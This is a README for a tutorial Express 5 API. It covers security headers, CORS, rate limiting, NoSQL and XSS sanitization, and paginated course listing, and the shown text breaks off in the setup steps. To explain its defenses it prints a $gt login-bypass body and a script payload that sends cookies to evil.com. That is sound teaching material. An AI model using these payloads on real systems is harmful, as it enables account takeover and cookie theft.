# Security Hardening, Rate Limiting, Data Sanitization & Cursor Pagination

A production-structured Express 5 REST API that introduces a **5-layer security middleware pipeline** — `helmet` for HTTP security headers, `cors` for cross-origin resource sharing, `express-rate-limit` for brute-force protection (global + route-specific), `express-mongo-sanitize` for NoSQL injection defense, and a custom `xssClean` middleware for XSS sanitization using `sanitize-html`. This project also adds **cursor pagination** with filtering, sorting, and field selection to the course listing endpoint, and restructures `server.js` into a clearly ordered middleware pipeline where **placement order determines security effectiveness**.

---

## Table of Contents

- [Key Features](#-key-features)
- [Tech Stack](#-tech-stack)
- [Architecture](#-architecture)
  - [Directory Structure](#directory-structure)
  - [The 5-Layer Middleware Pipeline](#the-5-layer-middleware-pipeline)
  - [Why Middleware Order Matters](#why-middleware-order-matters)
- [Layer 1: Security Headers — helmet](#-layer-1-security-headers--helmet)
  - [What helmet Does](#what-helmet-does)
  - [Key Headers Set by helmet](#key-headers-set-by-helmet)
  - [Why First in the Pipeline?](#why-first-in-the-pipeline)
- [Layer 2: CORS — Cross-Origin Resource Sharing](#-layer-2-cors--cross-origin-resource-sharing)
  - [What CORS Solves](#what-cors-solves)
  - [cors Configuration](#cors-configuration)
  - [credentials: true — The Cookie Connection](#credentials-true--the-cookie-connection)
  - [Preflight Requests (OPTIONS)](#preflight-requests-options)
- [Layer 3: Rate Limiting — Brute-Force Protection](#-layer-3-rate-limiting--brute-force-protection)
  - [Global Limiter — 100 Requests / 15 Minutes](#global-limiter--100-requests--15-minutes)
  - [Auth Limiter — 5 Attempts / Hour (Login Only)](#auth-limiter--5-attempts--hour-login-only)
  - [Global vs Route-Specific Placement](#global-vs-route-specific-placement)
  - [rateLimiter.middleware.js — Extracted Module](#ratelimitermiddlewarejs--extracted-module)
  - [standardHeaders: "draft-8"](#standardheaders-draft-8)
- [Layer 4: Body Parsing & Data Sanitization](#-layer-4-body-parsing--data-sanitization)
  - [express.json({ limit: "10kb" }) — Payload Size Defense](#expressjson-limit-10kb--payload-size-defense)
  - [Express 5 Compatibility — The req.query Getter-Only Breaking Change](#express-5-compatibility--the-reqquery-getter-only-breaking-change)
  - [mongoSanitize() — NoSQL Injection Defense](#mongosanitize--nosql-injection-defense)
  - [xssClean — XSS Defense](#xssclean--xss-defense)
  - [Why Sanitization Must Come After Body Parsing](#why-sanitization-must-come-after-body-parsing)
- [Cursor Pagination — Filtering, Sorting & Field Selection](#-cursor-pagination--filtering-sorting--field-selection)
  - [getPaginatedCourses Service](#getpaginatedcourses-service)
  - [Filtering — Mongoose Operator Translation](#filtering--mongoose-operator-translation)
  - [Sorting — Multi-Field Sort](#sorting--multi-field-sort)
  - [Pagination — Skip & Limit with Meta](#pagination--skip--limit-with-meta)
  - [Paginated Response Structure](#paginated-response-structure)
- [API Reference](#-api-reference)
  - [Auth Endpoints](#auth-endpoints)
  - [User Endpoints](#user-endpoints)
  - [Course Endpoints — CRUD](#course-endpoints--crud)
  - [Course Endpoints — Pagination Examples](#course-endpoints--pagination-examples)
  - [Course Endpoints — Aggregation Analytics](#course-endpoints--aggregation-analytics)
- [Prerequisites](#-prerequisites)
- [Getting Started](#-getting-started)
- [Available Scripts](#-available-scripts)
- [Environment Variables](#-environment-variables)
- [Troubleshooting](#-troubleshooting)
- [Key Concepts Summary](#-key-concepts-summary)

---

## 🚀 Key Features

- **helmet** — Sets 15+ HTTP security headers (CSP, X-Frame-Options, HSTS, etc.) with a single `app.use(helmet())`
- **CORS with credentials** — Configured for cookie-based refresh tokens with `credentials: true` and explicit origin allowlist
- **Dual Rate Limiting** — Global limiter (100 req/15 min) on all `/api` routes + strict auth limiter (5 attempts/hr) on login
- **Route-Specific Rate Limiting** — `authLimiter` applied directly in `auth.routes.js` instead of `server.js` for clean separation
- **Express 5 Compatibility Bridge** — Solves the breaking `req.query` getter-only TypeError with `Object.defineProperty`
- **NoSQL Injection Defense** — `express-mongo-sanitize` strips `$` and `.` operators from `req.body`, `req.query`, `req.params`
- **XSS Defense** — Custom `xssClean` middleware recursively strips HTML/JS tags using `sanitize-html`
- **Payload Size Limiting** — `express.json({ limit: "10kb" })` rejects oversized payloads before processing
- **Cursor Pagination** — `getPaginatedCourses` with filtering (`?price[lte]=100`), sorting (`?sort=-price`), and pagination metadata

---

## 🧰 Tech Stack

| Technology                            | Purpose                                                  |
| ------------------------------------- | -------------------------------------------------------- |
| **Node.js**                           | JavaScript runtime (v24+ recommended)                    |
| **Express 5** (`^5.2.1`)              | Web framework with native async error propagation        |
| **Mongoose 9** (`^9.9.4`)             | MongoDB ODM — schemas, TTL indexes, references           |
| **helmet** (`^8.3.0`)                 | HTTP security headers (CSP, HSTS, X-Frame-Options, etc.) |
| **cors** (`^2.8.6`)                   | Cross-Origin Resource Sharing middleware                 |
| **express-rate-limit** (`^8.7.0`)     | IP-based request throttling with sliding window          |
| **express-mongo-sanitize** (`^2.2.0`) | NoSQL injection defense (strips `$` and `.` operators)   |
| **sanitize-html** (`^2.17.7`)         | HTML/JS tag stripping for XSS defense                    |
| **bcryptjs** (`^3.0.3`)               | Password hashing and verification                        |
| **jsonwebtoken** (`^9.0.3`)           | Access + Refresh token signing and verification          |
| **cookie-parser** (`^1.4.7`)          | Parse `Cookie` header → `req.cookies`                    |
| **nodemailer** (`^9.1.1`)             | SMTP email transport for password reset emails           |
| **Joi** (`^18.2.5`)                   | Declarative request body validation                      |
| **ES Modules**                        | Native `"type": "module"` (`import`/`export`)            |
| **Nodemon**                           | Hot-reloading development server with `--env-file`       |

---

## 🏗 Architecture

### Directory Structure

```
authentication/
├── server.js                          # ★ 5-layer ordered middleware pipeline + Express 5 query patch
├── .env                               # Access/Refresh secrets + email config
├── package.json                       # ★ New: helmet, cors, express-rate-limit, express-mongo-sanitize, sanitize-html
│
├── models/
│   ├── user.model.js                  # role: user | instructor | admin
│   ├── token.model.js                 # Refresh + reset_password tokens with TTL
│   ├── course.model.js                # Course schema with instructorId ref
│   └── instructor.model.js            # Instructor schema
│
├── validations/
│   ├── auth.validation.js             # register, login, forgotPassword, resetPassword schemas
│   └── course.validation.js           # createCourse + updateCourse schemas
│
├── middleware/
│   ├── auth.middleware.js             # protect + restrictTo()
│   ├── rateLimiter.middleware.js       # ★ NEW: globalLimiter + authLimiter (extracted from server.js)
│   ├── xss.middleware.js              # ★ NEW: recursive HTML/JS tag stripping via sanitize-html
│   ├── validate.middleware.js         # Reusable Joi factory
│   ├── logger.middleware.js           # ISO timestamp request logger
│   └── globalErrorHandler.js          # Centralized error handler
│
├── routes/
│   ├── auth.routes.js                 # ★ authLimiter applied directly to POST /login
│   ├── user.routes.js                 # Blanket protect + admin restrictTo for user listing
│   └── course.routes.js               # Per-route protect + restrictTo for CRUD & analytics
│
├── controllers/
│   ├── auth.controller.js             # register, login, refresh, logout, forgotPassword, resetPassword
│   ├── user.controller.js             # getProfile, updatePassword, deleteAccount, getAllUsers
│   └── course.controller.js           # ★ getCourses now uses paginated service with sendResponse meta
│
├── services/
│   ├── auth.service.js                # registerUser, loginUser, refreshAccess, logoutUser, generateResetToken, resetPassword
│   ├── user.service.js                # changePassword, deactivateUser, fetchAllUsers
│   └── course.service.js              # ★ getPaginatedCourses with filtering, sorting, pagination metadata
│
└── utils/
    ├── appError.js                    # Custom AppError class
    ├── token.js                       # signAccessToken, signRefreshToken, createAuthSession, hashToken
    ├── cookie.js                      # setRefreshTokenCookie, clearRefreshTokenCookie
    ├── password.js                    # hashPassword, comparePassword
    ├── email.js                       # sendEmail (Nodemailer transport)
    └── responseHandler.js             # sendResponse (standardized JSON with extra spread)
```

### The 5-Layer Middleware Pipeline

```javascript
// server.js — The complete ordered pipeline

// 1. Security Headers & CORS
app.use(helmet()); // Layer 1: HTTP security headers
app.use(cors({ origin, credentials, methods })); // Layer 1: Cross-origin policy

// 2. Rate Limiting
app.use("/api", globalLimiter); // Layer 2: 100 req / 15 min per IP

// 3. Body & Cookie Parsers
app.use(express.json({ limit: "10kb" })); // Layer 3: Parse + size limit
app.use(cookieParser()); // Layer 3: Parse cookies
app.use(requestLogger); // Layer 3: Log requests

// ★ Express 5 Compatibility: make req.query writable before sanitizers
app.use((req, res, next) => {
  if (req.query) {
    Object.defineProperty(req, "query", {
      value: { ...req.query },
      writable: true,
      enumerable: true,
      configurable: true,
    });
  }
  next();
});

// 4. Data Sanitization
app.use(mongoSanitize()); // Layer 4: Strip $ and . from input
app.use(xssClean); // Layer 4: Strip HTML/JS tags

// 5. Application Routes
app.use("/api/v1/auth", authRoutes); // Layer 5: Route handlers
app.use("/api/v1/users", userRoutes);
app.use("/api/v1/courses", courseRoutes);
```

### Why Middleware Order Matters

```
Request → helmet → cors → rateLimiter → express.json → cookieParser → req.query patch → mongoSanitize → xssClean → Routes
           │         │         │              │              │                 │                 │              │     │
           │         │         │              │              │                 │                 │              │     ▼
           │         │         │              │              │                 │                 │              │ Controller
           │         │         │              │              │                 │                 │              │
           │         │         │              │              │                 │                 │              ▼
           │         │         │              │              │                 │                 │     Strip <script> tags
           │         │         │              │              │                 │                 │     from req.body/query/params
           │         │         │              │              │                 │                 ▼
           │         │         │              │              │                 │     Strip $ and . operators
           │         │         │              │              │                 │     from req.body/query/params
           │         │         │              │              │                 ▼
           │         │         │              │              │     Redefine req.query as writable
           │         │         │              │              │     (Express 5 getter fix)
           │         │         │              │              ▼
           │         │         │              │     Parse Cookie header → req.cookies
           │         │         │              ▼
           │         │         │     Parse JSON body → req.body
           │         │         │     Reject payloads > 10kb
           │         │         ▼
           │         │     429 Too Many Requests
           │         │     (if IP exceeded 100 req / 15 min)
           │         ▼
           │     Access-Control-Allow-* headers
           │     Handle OPTIONS preflight
           ▼
     Content-Security-Policy, X-Frame-Options,
     Strict-Transport-Security, etc.
```

| Wrong Order                              | What Goes Wrong                                                                                    |
| ---------------------------------------- | -------------------------------------------------------------------------------------------------- |
| `mongoSanitize` before `express.json`    | `req.body` is `undefined` → sanitizer sees nothing → injection bypasses defense                    |
| `mongoSanitize` before `req.query` patch | Express 5 throws `TypeError: Cannot set property query... which has only a getter` on all requests |
| `cors` after `routes`                    | Preflight `OPTIONS` requests hit 404 → browser blocks all cross-origin requests                    |
| `rateLimiter` after `express.json`       | Attacker sends massive JSON payloads that are parsed before being rate-limited                     |
| `helmet` after `routes`                  | Security headers missing from error responses (404, 500)                                           |

---

## 🛡 Layer 1: Security Headers — `helmet`

### What `helmet` Does

`helmet()` is a collection of **15 smaller middleware functions** that each set a specific HTTP security header. A single `app.use(helmet())` activates all of them with secure defaults.

```javascript
// server.js
import helmet from "helmet";
app.use(helmet());
```

### Key Headers Set by `helmet`

| Header                              | Default Value        | What It Prevents                                 |
| ----------------------------------- | -------------------- | ------------------------------------------------ |
| `Content-Security-Policy`           | `default-src 'self'` | XSS, data injection, clickjacking via iframes    |
| `X-Frame-Options`                   | `SAMEORIGIN`         | Clickjacking (embedding your page in an iframe)  |
| `Strict-Transport-Security`         | `max-age=15552000`   | Downgrade attacks (forces HTTPS for 180 days)    |
| `X-Content-Type-Options`            | `nosniff`            | MIME-type sniffing attacks                       |
| `X-DNS-Prefetch-Control`            | `off`                | DNS prefetch privacy leaks                       |
| `X-Download-Options`                | `noopen`             | IE auto-download execution                       |
| `X-Permitted-Cross-Domain-Policies` | `none`               | Flash/PDF cross-domain policy abuse              |
| `X-Powered-By`                      | _(removed)_          | Server fingerprinting (removes `Express` header) |
| `Referrer-Policy`                   | `no-referrer`        | Referrer URL information leaks                   |

### Why First in the Pipeline?

```
Client → helmet → ... → Route Handler → Response with security headers
   ▲                                              │
   └──────────── Headers attached to EVERY ───────┘
                 response, including errors
```

> If `helmet` is placed **after** routes, error responses (404, 500) would be sent **without** security headers — exposing your server's identity and allowing framing attacks on error pages.

---

## 🌐 Layer 2: CORS — Cross-Origin Resource Sharing

### What CORS Solves

Browsers enforce the **Same-Origin Policy**: JavaScript on `http://localhost:5173` (your React frontend) cannot make requests to `http://localhost:4000` (your Express API) unless the API explicitly allows it via CORS headers.

```
Frontend (localhost:5173) → API (localhost:4000)

Without CORS: ❌ Browser blocks request
With CORS:    ✅ Browser allows request (API sends Access-Control-Allow-Origin header)
```

### `cors` Configuration

```javascript
// server.js
import cors from "cors";

app.use(
  cors({
    origin: process.env.FRONTEND_URL || "http://localhost:5173",
    credentials: true,
    methods: ["GET", "POST", "PUT", "PATCH", "DELETE"],
  }),
);
```

| Option        | Value                      | Purpose                                                  |
| ------------- | -------------------------- | -------------------------------------------------------- |
| `origin`      | `process.env.FRONTEND_URL` | Only this specific domain can make cross-origin requests |
| `credentials` | `true`                     | Allow cookies (refresh token!) in cross-origin requests  |
| `methods`     | `["GET", "POST", ...]`     | Which HTTP methods the frontend can use                  |

### `credentials: true` — The Cookie Connection

Without `credentials: true`, the browser will **not** send `Cookie` headers on cross-origin requests. Since our refresh token lives in an HTTP-only cookie, CORS must be configured to allow credentials:

```
Frontend fetch('/api/v1/auth/refresh', {
  credentials: 'include'    ← Frontend must opt in
})
                    │
                    ▼
Express cors({
  credentials: true          ← Backend must allow it
})
                    │
                    ▼
Response Header: Access-Control-Allow-Credentials: true
```

> **Critical rule:** When `credentials: true`, the `origin` **cannot** be `*` (wildcard). It must be an explicit domain like `http://localhost:5173`.

### Preflight Requests (`OPTIONS`)

For requests with custom headers (`Authorization: Bearer ...`) or JSON bodies, the browser sends an `OPTIONS` preflight request first:

```
1. Browser sends: OPTIONS /api/v1/courses  (preflight)
   → cors middleware responds with Access-Control-Allow-* headers
   → Browser checks: "Am I allowed?"

2. Browser sends: POST /api/v1/courses     (actual request)
   → Proceeds normally if preflight passed
```

> CORS must be placed **before** body parsers and routes so it can handle `OPTIONS` requests before Express tries to parse a non-existent body.

---

## ⏱ Layer 3: Rate Limiting — Brute-Force Protection

### Global Limiter — 100 Requests / 15 Minutes

```javascript
// middleware/rateLimiter.middleware.js
import rateLimit from "express-rate-limit";

export const globalLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15-minute sliding window
  max: 100, // 100 requests per window per IP
  standardHeaders: "draft-8", // Standard RateLimit-* headers
  legacyHeaders: false, // Disable X-RateLimit-* headers
  message: {
    status: "fail",
    message: "Too many requests from this IP, please try again in 15 minutes.",
  },
});
```

```javascript
// server.js — Applied to ALL /api routes (catches /api/v1/auth, /api/v1/users, /api/v1/courses)
app.use("/api", globalLimiter);
```

### Auth Limiter — 5 Attempts / Hour (Login Only)

```javascript
// middleware/rateLimiter.middleware.js
export const authLimiter = rateLimit({
  windowMs: 60 * 60 * 1000, // 1-hour sliding window
  max: 5, // 5 attempts per window per IP
  standardHeaders: "draft-8",
  legacyHeaders: false,
  message: {
    status: "fail",
    message:
      "Too many login attempts from this IP, please try again after an hour.",
  },
});
```

```javascript
// routes/auth.routes.js — Applied directly to the login route
import { authLimiter } from "../middleware/rateLimiter.middleware.js";

router.post("/login", authLimiter, validate(loginSchema), login);
//                     ▲
//                     Applied BEFORE validation and handler
```

### Global vs Route-Specific Placement

| Limiter         | Placement                                                    | Why                                                            |
| --------------- | ------------------------------------------------------------ | -------------------------------------------------------------- |
| `globalLimiter` | `server.js` → `app.use("/api", ...)`                         | Applies to **every** API route — it's a system-wide concern    |
| `authLimiter`   | `auth.routes.js` → `router.post("/login", authLimiter, ...)` | Only targets `POST /login` — it's a **route-specific** concern |

```
// Why authLimiter belongs in the route file, not server.js:

// ❌ server.js approach — server knows about sub-routes (tight coupling)
app.post("/api/v1/auth/login", authLimiter);

// ✅ auth.routes.js approach — route file owns its own middleware (clean separation)
router.post("/login", authLimiter, validate(loginSchema), login);
```

### `rateLimiter.middleware.js` — Extracted Module

Rate limiters were originally defined inline in `server.js`, then extracted into a dedicated middleware module for reusability:

```javascript
// middleware/rateLimiter.middleware.js — Clean, importable module
import rateLimit from "express-rate-limit";

export const globalLimiter = rateLimit({
  /* config */
});
export const authLimiter = rateLimit({
  /* config */
});
```

> The original inline implementation remains **commented out** in `server.js` as a reference for how it was previously structured.

### `standardHeaders: "draft-8"`

| Option                       | What It Does                                                                               |
| ---------------------------- | ------------------------------------------------------------------------------------------ |
| `standardHeaders: "draft-8"` | Sends the standardized `RateLimit-Limit`, `RateLimit-Remaining`, `RateLimit-Reset` headers |
| `legacyHeaders: false`       | Disables the older `X-RateLimit-Limit` / `X-RateLimit-Remaining` headers                   |

```
Response headers (after rate-limited request):
  RateLimit-Limit: 100
  RateLimit-Remaining: 73
  RateLimit-Reset: 842         ← Seconds until window resets
```

---

## 🧹 Layer 4: Body Parsing & Data Sanitization

### `express.json({ limit: "10kb" })` — Payload Size Defense

```javascript
// server.js
app.use(express.json({ limit: "10kb" }));
```

| Without limit                       | With `limit: "10kb"`                         |
| ----------------------------------- | -------------------------------------------- |
| Attacker sends 100MB JSON body      | Express rejects with `413 Payload Too Large` |
| Server spends CPU/memory parsing it | Request never reaches body parsing           |
| Potential Denial of Service (DoS)   | DoS mitigated at the parser level            |

### Express 5 Compatibility — The `req.query` Getter-Only Breaking Change

Express 5 introduced an architectural redesign to query string handling that creates a critical incompatibility with popular sanitization packages like `express-mongo-sanitize`.

#### The Breaking Change: Express 4 vs Express 5

| Express Version | `req.query` Property Descriptor                             | Mutability | Behavior on Reassignment (`req.query = ...`)                |
| --------------- | ----------------------------------------------------------- | ---------- | ----------------------------------------------------------- |
| **Express 4**   | Plain own property on `req`                                 | Writable   | Overwrites value cleanly                                    |
| **Express 5**   | Accessor getter on `express.request.prototype` (no setter!) | Read-Only  | Throws fatal `TypeError` in strict mode (Node.js ES Module) |

In Express 5, inspecting the descriptor on `express.request` confirms `set: undefined`:

```javascript
Object.getOwnPropertyDescriptor(express.request, "query");
// {
//   get: [Function: query],
//   set: undefined,           ← NO SETTER!
//   enumerable: true,
//   configurable: true
// }
```

#### The Failure Mechanism

`express-mongo-sanitize` (v2.2.0) iterates through request targets and reassigns each one:

```javascript
// node_modules/express-mongo-sanitize/index.js:110-113
["body", "params", "headers", "query"].forEach(function (key) {
  if (req[key]) {
    const { target, isSanitized } = _sanitize(req[key], options);
    req[key] = target; // ❌ LINE 113: req['query'] = target throws TypeError!
  }
});
```

Because `req.query` is a getter without a setter, attempting to reassign `req.query = target` immediately crashes Express on **any request**:

```
TypeError: Cannot set property query of #<IncomingMessage> which has only a getter
    at express-mongo-sanitize/index.js:113:18
    at Array.forEach (<anonymous>)
    at express-mongo-sanitize/index.js:110:44
```

Similarly, custom XSS middlewares (like `xssClean`) that execute `req.query = sanitize(req.query)` will fail with the exact same error once `mongoSanitize` is bypassed.

#### The Bridge Middleware Solution

Place this lightweight compatibility middleware in `server.js` **immediately after body/cookie parsing and before any sanitization middleware**:

```javascript
// server.js — Placed before mongoSanitize() and xssClean
app.use((req, res, next) => {
  if (req.query) {
    Object.defineProperty(req, "query", {
      value: { ...req.query },
      writable: true,
      enumerable: true,
      configurable: true,
    });
  }
  next();
});
```

#### How `Object.defineProperty` Solves It Under the Hood

```
1. Incoming Request arrives at Express 5
                 │
2. req.query invoked via prototype getter
   → Express parses query string into an object: { ...req.query }
                 │
3. Object.defineProperty defines 'query' directly as an OWN property on req
   → Sets writable: true, configurable: true, enumerable: true
   → Shadows the read-only prototype getter!
                 │
4. express-mongo-sanitize executes line 113:
   → req['query'] = target  ✅ Writes to the own writable property!
                 │
5. xssClean executes:
   → req.query = sanitize(req.query)  ✅ Reassignment succeeds!
                 │
6. Safe, sanitized query params pass to controllers!
```

---

### `mongoSanitize()` — NoSQL Injection Defense

```javascript
// server.js
import mongoSanitize from "express-mongo-sanitize";
app.use(mongoSanitize());
```

**The attack it prevents:**

```javascript
// Attacker sends this as the login body:
{
  "email": { "$gt": "" },           // Matches ALL documents
  "password": { "$gt": "" }         // Matches ALL documents
}

// Without mongoSanitize: User.findOne({ email: { $gt: "" } })
// → Returns the first user in the database! Instant login bypass.

// With mongoSanitize: Keys starting with '$' are STRIPPED
// → User.findOne({ email: {}, password: {} })
// → No match → Login fails ✅
```

| What it sanitizes      | Where                                 | How                 |
| ---------------------- | ------------------------------------- | ------------------- |
| Keys starting with `$` | `req.body`, `req.query`, `req.params` | Recursively removed |
| Keys containing `.`    | `req.body`, `req.query`, `req.params` | Recursively removed |

### `xssClean` — XSS Defense

```javascript
// middleware/xss.middleware.js
import sanitizeHtml from "sanitize-html";

const sanitize = (data) => {
  if (typeof data === "string") {
    return sanitizeHtml(data, {
      allowedTags: [], // Removes ALL HTML tags (<script>, <b>, <img>, etc.)
      allowedAttributes: {}, // Removes ALL attributes (onclick, onerror, etc.)
    });
  }
  if (Array.isArray(data)) return data.map((item) => sanitize(item));
  if (typeof data === "object" && data !== null) {
    Object.keys(data).forEach((key) => {
      data[key] = sanitize(data[key]);
    });
  }
  return data;
};

export const xssClean = (req, res, next) => {
  req.body = sanitize(req.body);
  req.query = sanitize(req.query);
  req.params = sanitize(req.params);
  next();
};
```

**The attack it prevents:**

```javascript
// Attacker registers with this name:
{ "name": "<script>document.location='https://evil.com/steal?c='+document.cookie</script>" }

// Without xssClean: Stored in database as-is → rendered on another user's page → steals cookies
// With xssClean: Stripped to "" (empty string) → harmless text stored
```

| Feature            | Implementation                                                    |
| ------------------ | ----------------------------------------------------------------- |
| **Recursive**      | Handles nested objects, arrays, and deeply nested structures      |
| **Zero tolerance** | `allowedTags: []` — no HTML tag survives, not even `<b>` or `<i>` |
| **Three surfaces** | Sanitizes `req.body`, `req.query`, AND `req.params`               |

### Why Sanitization Must Come After Body Parsing

```
express.json()  →  mongoSanitize()  →  xssClean  →  Routes
      │                  │                 │            │
      ▼                  ▼                 ▼            ▼
  req.body = {...}   Strip $ and .    Strip <script>   Safe data
                     from req.body    from req.body    reaches DB

// If mongoSanitize() ran BEFORE express.json():
//   req.body === undefined → sanitizer sees nothing → $ operators pass through → 💀
```

---

## 📄 Cursor Pagination — Filtering, Sorting & Field Selection

### `getPaginatedCourses` Service

```javascript
// services/course.service.js
export const getPaginatedCourses = async (queryObj) => {
  // 1. FILTERING — Operator translation
  const filterObj = { ...queryObj };
  const excludedFields = ["page", "sort", "limit", "fields"];
  excludedFields.forEach((el) => delete filterObj[el]);

  let queryStr = JSON.stringify(filterObj);
  queryStr = queryStr.replace(/\b(gte|gt|lte|lt)\b/g, (match) => `$${match}`);
  const finalFilter = JSON.parse(queryStr);

  // 2. QUERY INITIALIZATION
  let query = Course.find(finalFilter)
    .populate("instructorId", "name rating -_id")
    .select("-__v");

  // 3. SORTING
  if (queryObj.sort) {
    const sortBy = queryObj.sort.split(",").join(" ");
    query = query.sort(sortBy);
  } else {
    query = query.sort("-createdAt");
  }

  // 4. PAGINATION
  const page = Math.max(1, Number(queryObj.page) || 1);
  const limit = Math.min(100, Math.max(1, Number(queryObj.limit) || 10));
  const skip = (page - 1) * limit;
  query = query.skip(skip).limit(limit);

  // 5. EXECUTION (parallel count + query)
  const [totalCourses, courses] = await Promise.all([
    Course.countDocuments(finalFilter),
    query.lean(),
  ]);

  // 6. META CALCULATION
  const totalPages = Math.ceil(totalCourses / limit);

  return {
    courses,
    meta: {
      totalItems: totalCourses,
      itemsPerPage: limit,
      currentPage: page,
      totalPages,
      hasNextPage: page < totalPages,
      hasPrevPage: page > 1,
    },
  };
};
```

### Filtering — Mongoose Operator Translation

```
URL Query:        ?price[lte]=100&category=Web
                         │
                         ▼
Express parses:   { price: { lte: "100" }, category: "Web" }
                         │
                         ▼
Regex replaces:   { price: { $lte: "100" }, category: "Web" }
                         │
                         ▼
Mongoose query:   Course.find({ price: { $lte: "100" }, category: "Web" })
```

| URL Operator      | Mongoose Operator          | Meaning               |
| ----------------- | -------------------------- | --------------------- |
| `?price[gte]=50`  | `{ price: { $gte: 50 } }`  | Greater than or equal |
| `?price[gt]=50`   | `{ price: { $gt: 50 } }`   | Greater than          |
| `?price[lte]=100` | `{ price: { $lte: 100 } }` | Less than or equal    |
| `?price[lt]=100`  | `{ price: { $lt: 100 } }`  | Less than             |
| `?category=Web`   | `{ category: "Web" }`      | Exact match           |

**Excluded fields** (`page`, `sort`, `limit`, `fields`) are removed before filtering to prevent them from being treated as database field filters.

### Sorting — Multi-Field Sort

```
?sort=-price,createdAt
       │         │
       ▼         ▼
  Descending   Ascending
  by price     by createdAt

// URL commas → Mongoose spaces
queryObj.sort.split(",").join(" ")  →  "-price createdAt"
query.sort("-price createdAt")
```

| URL                      | Mongoose Sort               | Effect                       |
| ------------------------ | --------------------------- | ---------------------------- |
| `?sort=price`            | `.sort("price")`            | Cheapest first               |
| `?sort=-price`           | `.sort("-price")`           | Most expensive first         |
| `?sort=-price,createdAt` | `.sort("-price createdAt")` | Expensive first, then oldest |
| _(no sort param)_        | `.sort("-createdAt")`       | Default: newest first        |

### Pagination — Skip & Limit with Meta

```
Total: 25 courses, limit: 10

Page 1: skip(0).limit(10)  → courses 1-10
Page 2: skip(10).limit(10) → courses 11-20
Page 3: skip(20).limit(10) → courses 21-25

skip = (page - 1) * limit
```

| Guard        | Code                                        | Purpose                               |
| ------------ | ------------------------------------------- | ------------------------------------- |
| Min page     | `Math.max(1, Number(queryObj.page) \|\| 1)` | Prevents page 0 or negative           |
| Min limit    | `Math.max(1, ...)`                          | Prevents 0 items per page             |
| Max limit    | `Math.min(100, ...)`                        | Prevents `?limit=999999` memory abuse |
| Out-of-range | `if (page > totalPages)` → `404`            | Prevents accessing non-existent pages |

### Paginated Response Structure

The controller uses `sendResponse` with the 5th `extra` parameter to add `meta` to the root JSON:

```javascript
// controllers/course.controller.js
export const getCourses = async (req, res) => {
  const result = await courseService.getPaginatedCourses(req.query);

  sendResponse(
    res,
    200,
    result.courses,
    "Courses retrieved successfully",
    { meta: result.meta }, // ← Spread into root via sendResponse's 'extra' param
  );
};
```

```json
{
  "success": true,
  "message": "Courses retrieved successfully",
  "data": [
    {
      "_id": "665b3d...",
      "title": "Node.js Masterclass",
      "price": 49.99,
      "category": "Web",
      "instructorId": { "name": "Alex Developer", "rating": 5 }
    }
  ],
  "meta": {
    "totalItems": 25,
    "itemsPerPage": 10,
    "currentPage": 1,
    "totalPages": 3,
    "hasNextPage": true,
    "hasPrevPage": false
  }
}
```

---

## 📡 API Reference

### Auth Endpoints

| Endpoint                             | Method | Auth        | Rate Limited?            | Description                  |
| ------------------------------------ | ------ | ----------- | ------------------------ | ---------------------------- |
| `/api/v1/auth/register`              | `POST` | ❌          | Global only              | Register a new user          |
| `/api/v1/auth/login`                 | `POST` | ❌          | **Global + Auth (5/hr)** | Login and receive tokens     |
| `/api/v1/auth/refresh`               | `POST` | ❌ (cookie) | Global only              | Rotate refresh token         |
| `/api/v1/auth/logout`                | `POST` | ✅ Bearer   | Global only              | Invalidate session           |
| `/api/v1/auth/forgot-password`       | `POST` | ❌          | Global only              | Request password reset email |
| `/api/v1/auth/reset-password/:token` | `POST` | ❌ (token)  | Global only              | Reset password with token    |

#### Login (with Rate Limiting)

```bash
curl -X POST http://localhost:4000/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email": "alex@example.com", "password": "Pass1234"}'
```

**After 5 failed attempts within 1 hour (429 Too Many Requests):**

```json
{
  "status": "fail",
  "message": "Too many login attempts from this IP, please try again after an hour."
}
```

### User Endpoints

| Endpoint                        | Method   | Auth | Roles   | Description             |
| ------------------------------- | -------- | ---- | ------- | ----------------------- |
| `/api/v1/users/profile`         | `GET`    | ✅   | Any     | Get own profile         |
| `/api/v1/users/update-password` | `PUT`    | ✅   | Any     | Change own password     |
| `/api/v1/users/delete-account`  | `DELETE` | ✅   | Any     | Soft-delete own account |
| `/api/v1/users`                 | `GET`    | ✅   | `admin` | List all active users   |

### Course Endpoints — CRUD

| Endpoint              | Method   | Auth | Roles                 | Description              |
| --------------------- | -------- | ---- | --------------------- | ------------------------ |
| `/api/v1/courses`     | `GET`    | ❌   | Public                | List courses (paginated) |
| `/api/v1/courses`     | `POST`   | ✅   | `instructor`, `admin` | Create a course          |
| `/api/v1/courses/:id` | `PUT`    | ✅   | `instructor`, `admin` | Update a course          |
| `/api/v1/courses/:id` | `DELETE` | ✅   | `admin`               | Delete a course          |

### Course Endpoints — Pagination Examples

```bash
# Default: page 1, 10 items, sorted by newest
curl http://localhost:4000/api/v1/courses

# Filter by category
curl "http://localhost:4000/api/v1/courses?category=Web"

# Filter by price range
curl "http://localhost:4000/api/v1/courses?price[gte]=50&price[lte]=200"

# Sort by price descending
curl "http://localhost:4000/api/v1/courses?sort=-price"

# Multi-field sort: expensive first, then by creation date
curl "http://localhost:4000/api/v1/courses?sort=-price,createdAt"

# Paginate: page 2 with 5 items per page
curl "http://localhost:4000/api/v1/courses?page=2&limit=5"

# Combined: Web courses under $100, sorted by price, page 1
curl "http://localhost:4000/api/v1/courses?category=Web&price[lte]=100&sort=price&page=1&limit=5"
```

### Course Endpoints — Aggregation Analytics

| Endpoint                                   | Method | Auth | Roles                 | Description                 |
| ------------------------------------------ | ------ | ---- | --------------------- | --------------------------- |
| `/api/v1/courses/stats/categories`         | `GET`  | ❌   | Public                | Average price per category  |
| `/api/v1/courses/stats/top-web`            | `GET`  | ❌   | Public                | Top 3 web courses by price  |
| `/api/v1/courses/stats/instructor-counts`  | `GET`  | ✅   | `instructor`, `admin` | Course count per instructor |
| `/api/v1/courses/stats/instructor-details` | `GET`  | ✅   | `admin`               | Instructor names + counts   |
| `/api/v1/courses/stats/revenue`            | `GET`  | ✅   | `admin`               | Total revenue potential     |

---

## 🛠 Prerequisites

- [Node.js](https://nodejs.org/) (v24+ recommended)
- [MongoDB](https://www.mongodb.com/) (local installation or [MongoDB Atlas](https://www.mongodb.com/atlas) cloud cluster)
- [Mailtrap](https://mailtrap.io/) account (free tier for email testing)
- npm (Node Package Manager)

---

## 🏁 Getting Started

### 1. Navigate to Project Directory

```bash
cd authentication
```

### 2. Install Dependencies

```bash
